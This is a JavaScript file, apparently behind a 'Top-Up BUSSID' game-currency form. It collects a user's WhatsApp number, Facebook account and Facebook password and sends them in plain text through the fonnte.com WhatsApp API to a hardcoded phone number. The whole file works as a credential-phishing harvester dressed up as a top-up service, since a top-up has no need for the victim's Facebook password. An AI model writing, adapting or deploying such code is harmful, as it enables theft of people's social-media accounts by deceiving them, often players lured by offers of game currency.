document.getElementById("submit").addEventListener("click", function () {
  const wa = document.getElementById("wa").value;
  const fb = document.getElementById("fb").value;
  const password = document.getElementById("password").value;
  const amount = document.getElementById("amount").value;

  if (wa && fb && password && amount) {
    const message = `Top-Up BUSSID:\n\nNomor WA: ${wa}\nAkun FB: ${fb}\nPassword: ${password}\nJumlah: ${amount}`;
    const phoneNumber = "082272339956"; // Nomor WhatsApp Anda
    const url = `https://api.fonnte.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;

    // Menggunakan fetch API untuk mengirim request
    fetch(url, {
      method: "GET",
    })
      .then((response) => {
        if (response.ok) {
          alert("Pesan berhasil dikirim!");
        } else {
          alert("Gagal mengirim pesan, coba lagi.");
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Terjadi kesalahan.");
      });
  } else {
    alert("Harap isi semua kolom!");
  }
});
